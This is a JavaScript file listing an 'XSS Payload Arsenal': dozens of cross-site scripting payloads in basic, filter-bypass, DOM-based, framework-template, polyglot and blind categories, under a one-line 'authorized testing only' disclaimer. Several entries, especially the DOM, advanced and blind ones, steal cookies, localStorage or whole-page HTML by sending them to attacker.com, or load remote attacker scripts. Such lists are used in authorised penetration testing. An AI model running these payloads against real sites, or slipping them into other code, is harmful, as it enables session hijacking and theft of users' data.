// XSS Payload Arsenal - Comprehensive Payload Database
// For authorized security testing only

const XSS_PAYLOADS = [

  // ===== BASIC =====
  { id: 1, name: "Classic Alert", cat: "basic", tag: "basic",
    code: `<script>alert('XSS')<\/script>` },

  { id: 2, name: "Alert with 1", cat: "basic", tag: "basic",
    code: `<script>alert(1)<\/script>` },

  { id: 3, name: "IMG onerror", cat: "basic", tag: "basic",
    code: `<img src=x onerror=alert('XSS')>` },

  { id: 4, name: "IMG onerror (number)", cat: "basic", tag: "basic",
    code: `<img src=x onerror=alert(1)>` },

  { id: 5, name: "SVG onload", cat: "basic", tag: "basic",
    code: `<svg onload=alert('XSS')>` },

  { id: 6, name: "Body onload", cat: "basic", tag: "basic",
    code: `<body onload=alert('XSS')>` },

  { id: 7, name: "Input autofocus onfocus", cat: "basic", tag: "basic",
    code: `<input autofocus onfocus=alert('XSS')>` },

  { id: 8, name: "Textarea autofocus onfocus", cat: "basic", tag: "basic",
    code: `<textarea autofocus onfocus=alert('XSS')>` },

  { id: 9, name: "Video onerror", cat: "basic", tag: "basic",
    code: `<video src=x onerror=alert('XSS')>` },

  { id: 10, name: "Audio onerror", cat: "basic", tag: "basic",
    code: `<audio src=x onerror=alert('XSS')>` },

  { id: 11, name: "Details ontoggle", cat: "basic", tag: "basic",
    code: `<details open ontoggle=alert('XSS')>` },

  { id: 12, name: "Select autofocus", cat: "basic", tag: "basic",
    code: `<select autofocus onfocus=alert('XSS')>` },

  { id: 13, name: "Script src data URI", cat: "basic", tag: "basic",
    code: `<script src="data:text/javascript,alert('XSS')"><\/script>` },

  { id: 14, name: "iFrame srcdoc", cat: "basic", tag: "basic",
    code: `<iframe srcdoc="<script>alert('XSS')<\/script>">` },

  { id: 15, name: "Marquee onstart", cat: "basic", tag: "basic",
    code: `<marquee onstart=alert('XSS')>test</marquee>` },

  // ===== WAF BYPASS =====
  { id: 20, name: "Mixed Case Tag", cat: "bypass", tag: "bypass",
    code: `<ScRiPt>alert('XSS')<\/ScRiPt>` },

  { id: 21, name: "Null Byte Injection", cat: "bypass", tag: "bypass",
    code: `<scr\x00ipt>alert('XSS')<\/scr\x00ipt>` },

  { id: 22, name: "Tab in Tag", cat: "bypass", tag: "bypass",
    code: `<img\tsrc=x\tonerror=alert('XSS')>` },

  { id: 23, name: "Newline in Tag", cat: "bypass", tag: "bypass",
    code: `<img\nsrc=x\nonerror=alert('XSS')>` },

  { id: 24, name: "Double Encoded", cat: "bypass", tag: "bypass",
    code: `%253Cscript%253Ealert('XSS')%253C%252Fscript%253E` },

  { id: 25, name: "HTML Entity Encoded", cat: "bypass", tag: "bypass",
    code: `&lt;script&gt;alert('XSS')&lt;/script&gt;` },

  { id: 26, name: "Unicode Encoding", cat: "bypass", tag: "bypass",
    code: `\u003cscript\u003ealert('XSS')\u003c/script\u003e` },

  { id: 27, name: "Hex Encoding", cat: "bypass", tag: "bypass",
    code: `<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>` },

  { id: 28, name: "Decimal Encoding", cat: "bypass", tag: "bypass",
    code: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` },

  { id: 29, name: "JS Comment Bypass", cat: "bypass", tag: "bypass",
    code: `<script>al/**/ert('XSS')<\/script>` },

  { id: 30, name: "Backtick Quote", cat: "bypass", tag: "bypass",
    code: `<img src=x onerror=alert\`XSS\`>` },

  { id: 31, name: "Slash Bypass", cat: "bypass", tag: "bypass",
    code: `</script><script>alert('XSS')<\/script>` },

  { id: 32, name: "Extra Slashes", cat: "bypass", tag: "bypass",
    code: `<img src=x onerror=/alert/(1)>` },

  { id: 33, name: "String.fromCharCode", cat: "bypass", tag: "bypass",
    code: `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))<\/script>` },

  { id: 34, name: "Atob Bypass", cat: "bypass", tag: "bypass",
    code: `<script>eval(atob('YWxlcnQoMSk='))<\/script>` },

  { id: 35, name: "Template Literal", cat: "bypass", tag: "bypass",
    code: `<svg onload=\`alert\`('XSS')\`>` },

  { id: 36, name: "SVG Animate", cat: "bypass", tag: "bypass",
    code: `<svg><animate onbegin=alert(1) attributeName=x></svg>` },

  { id: 37, name: "Object data", cat: "bypass", tag: "bypass",
    code: `<object data="javascript:alert('XSS')">` },

  { id: 38, name: "Embed src javascript", cat: "bypass", tag: "bypass",
    code: `<embed src="javascript:alert('XSS')">` },

  { id: 39, name: "Link onclick", cat: "bypass", tag: "bypass",
    code: `<a href="javascript:alert('XSS')">Click Me</a>` },

  { id: 40, name: "Form action javascript", cat: "bypass", tag: "bypass",
    code: `<form action="javascript:alert('XSS')"><input type=submit></form>` },

  // ===== DOM-BASED =====
  { id: 50, name: "Hash DOM", cat: "dom", tag: "dom",
    code: `#<img src=x onerror=alert('XSS')>` },

  { id: 51, name: "location.hash eval", cat: "dom", tag: "dom",
    code: `javascript:eval(location.hash.slice(1))` },

  { id: 52, name: "document.write", cat: "dom", tag: "dom",
    code: `<script>document.write('<img src=x onerror=alert(1)>')<\/script>` },

  { id: 53, name: "innerHTML", cat: "dom", tag: "dom",
    code: `<script>document.body.innerHTML='<img src=x onerror=alert(1)>'<\/script>` },

  { id: 54, name: "document.URL", cat: "dom", tag: "dom",
    code: `<script>eval(document.URL.split('#')[1])<\/script>` },

  { id: 55, name: "window.name", cat: "dom", tag: "dom",
    code: `<script>eval(window.name)<\/script>` },

  { id: 56, name: "location.search", cat: "dom", tag: "dom",
    code: `<script>eval(location.search.slice(1))<\/script>` },

  { id: 57, name: "PostMessage DOM", cat: "dom", tag: "dom",
    code: `<script>window.postMessage('<img src=x onerror=alert(1)>','*')<\/script>` },

  { id: 58, name: "outerHTML DOM", cat: "dom", tag: "dom",
    code: `<script>document.getElementById('x').outerHTML='<img src=x onerror=alert(1)>'<\/script>` },

  { id: 59, name: "setTimeout string", cat: "dom", tag: "dom",
    code: `<script>setTimeout("alert('XSS')",0)<\/script>` },

  { id: 60, name: "setInterval string", cat: "dom", tag: "dom",
    code: `<script>setInterval("alert('XSS')",1000)<\/script>` },

  { id: 61, name: "document.cookie steal", cat: "dom", tag: "dom",
    code: `<script>new Image().src='http://attacker.com/?c='+document.cookie<\/script>` },

  { id: 62, name: "localStorage DOM", cat: "dom", tag: "dom",
    code: `<script>eval(localStorage.getItem('payload'))<\/script>` },

  // ===== ADVANCED =====
  { id: 70, name: "SVG foreignObject", cat: "advanced", tag: "advanced",
    code: `<svg><foreignObject><script>alert('XSS')<\/script></foreignObject></svg>` },

  { id: 71, name: "SVG Use xlink", cat: "advanced", tag: "advanced",
    code: `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)<\/script></svg>#x"/>` },

  { id: 72, name: "CSS Expression (IE)", cat: "advanced", tag: "advanced",
    code: `<div style="width:expression(alert('XSS'))">` },

  { id: 73, name: "Math.max Bypass", cat: "advanced", tag: "advanced",
    code: `<script>Math['max'](alert(1))<\/script>` },

  { id: 74, name: "Fetch Exfil", cat: "advanced", tag: "advanced",
    code: `<script>fetch('https://attacker.com/?c='+btoa(document.cookie))<\/script>` },

  { id: 75, name: "XHR Exfil", cat: "advanced", tag: "advanced",
    code: `<script>var x=new XMLHttpRequest();x.open('GET','https://attacker.com/?c='+document.cookie);x.send()<\/script>` },

  { id: 76, name: "Script Gadget - jQuery", cat: "advanced", tag: "advanced",
    code: `<div data-bind="value: constructor.constructor('alert(1)')()">` },

  { id: 77, name: "AngularJS Template", cat: "advanced", tag: "advanced",
    code: `{{constructor.constructor('alert(1)')()}}` },

  { id: 78, name: "AngularJS ng-app", cat: "advanced", tag: "advanced",
    code: `<div ng-app>{{$on.constructor('alert(1)')()}}</div>` },

  { id: 79, name: "Vue.js Template", cat: "advanced", tag: "advanced",
    code: `{{constructor.constructor('alert(document.domain)')()}}` },

  { id: 80, name: "React dangerouslySetInnerHTML", cat: "advanced", tag: "advanced",
    code: `<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />` },

  { id: 81, name: "CSS Import", cat: "advanced", tag: "advanced",
    code: `<style>@import'javascript:alert(1)'</style>` },

  { id: 82, name: "META Refresh JS", cat: "advanced", tag: "advanced",
    code: `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">` },

  { id: 83, name: "Script nonce bypass", cat: "advanced", tag: "advanced",
    code: `<script nonce=NONCE_VALUE>alert('XSS')<\/script>` },

  { id: 84, name: "CDATA Bypass XML", cat: "advanced", tag: "advanced",
    code: `<![CDATA[<script>alert('XSS')<\/script>]]>` },

  { id: 85, name: "mXSS mutation", cat: "advanced", tag: "advanced",
    code: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` },

  // ===== POLYGLOT =====
  { id: 90, name: "Polyglot #1 (Classic)", cat: "polyglot", tag: "poly",
    code: `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` },

  { id: 91, name: "Polyglot #2 (Short)", cat: "polyglot", tag: "poly",
    code: `'">><marquee><img src=x onerror=confirm(1)></marquee>">` },

  { id: 92, name: "Polyglot #3 (href)", cat: "polyglot", tag: "poly",
    code: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>` },

  { id: 93, name: "Polyglot #4 (Full)", cat: "polyglot", tag: "poly",
    code: `'"><img/src/onerror=.1|alert\`1\`>` },

  { id: 94, name: "Polyglot #5 (PortSwigger)", cat: "polyglot", tag: "poly",
    code: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` },

  // ===== BLIND XSS =====
  { id: 100, name: "Blind - Script Tag", cat: "blind", tag: "bypass",
    code: `<script src="https://your.burpsuite.net/payload.js"><\/script>` },

  { id: 101, name: "Blind - XSS Hunter", cat: "blind", tag: "bypass",
    code: `"><script src="//your-xss-hunter.xss.ht"><\/script>` },

  { id: 102, name: "Blind - IMG Exfil", cat: "blind", tag: "bypass",
    code: `<img src="https://attacker.com/log?cookie="+document.cookie>` },

  { id: 103, name: "Blind - Fetch POST", cat: "blind", tag: "advanced",
    code: `<script>fetch('https://attacker.com/',{method:'POST',body:document.cookie})<\/script>` },

  { id: 104, name: "Blind - localStorage dump", cat: "blind", tag: "advanced",
    code: `<script>new Image().src='https://attacker.com/?ls='+btoa(JSON.stringify(localStorage))<\/script>` },

  { id: 105, name: "Blind - Full page dump", cat: "blind", tag: "advanced",
    code: `<script>new Image().src='https://attacker.com/?html='+btoa(document.documentElement.innerHTML)<\/script>` },
];
